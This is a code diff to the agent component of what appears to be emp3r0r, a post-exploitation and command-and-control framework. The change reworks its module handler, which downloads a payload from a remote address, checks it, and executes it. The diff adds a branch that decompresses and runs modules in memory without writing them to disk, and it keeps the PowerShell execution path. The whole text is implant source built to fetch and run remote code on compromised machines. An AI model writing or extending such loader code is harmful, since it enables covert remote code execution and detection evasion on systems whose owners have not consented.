@@ -10,6 +10,7 @@ import (
 	"strconv"
 	"strings"
 
+	"github.com/jm33-m0/arc"
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -20,12 +21,14 @@ import (
 func moduleHandler(download_addr, file_to_download, payload_type, modName, checksum, exec_cmd string, env []string, inMem bool) (out string) {
 	tarball := filepath.Join(RuntimeConfig.AgentRoot, modName+".tar.xz")
 	modDir := filepath.Join(RuntimeConfig.AgentRoot, modName)
+	var err error
 
 	// download and extract module file
-	payload_data, downloadErr := downloadAndVerifyModule(file_to_download, checksum, download_addr)
+	payload_data_downloaded, downloadErr := downloadAndVerifyModule(file_to_download, checksum, download_addr)
 	if downloadErr != nil {
 		return downloadErr.Error()
 	}
+	payload_data := payload_data_downloaded
 	if !inMem {
 		// write-to-disk modules
 		err := os.WriteFile(tarball, payload_data, 0o600)
@@ -43,15 +46,25 @@ func moduleHandler(download_addr, file_to_download, payload_type, modName, check
 		if err != nil {
 			return fmt.Sprintf("cd to %s: %v", modDir, err)
 		}
+	} else {
+		payload_data, err = arc.DecompressXz(payload_data_downloaded)
+		if err != nil {
+			return fmt.Sprintf("decompressing %s: %v", file_to_download, err)
+		}
 	}
 
 	// construct command
+	var (
+		executable string
+		args       = []string{}
+	)
 	fields := strings.Fields(exec_cmd)
-	if len(fields) == 0 {
-		return fmt.Sprintf("empty exec_cmd: %s (env: %v)", strconv.Quote(exec_cmd), env)
+	if !inMem {
+		if len(fields) == 0 {
+			return fmt.Sprintf("empty exec_cmd: %s (env: %v)", strconv.Quote(exec_cmd), env)
+		}
+		executable = fields[0]
 	}
-	executable := fields[0]
-	args := []string{}
 	switch payload_type {
 	case "powershell":
 		out, err := RunPSScript(payload_data)
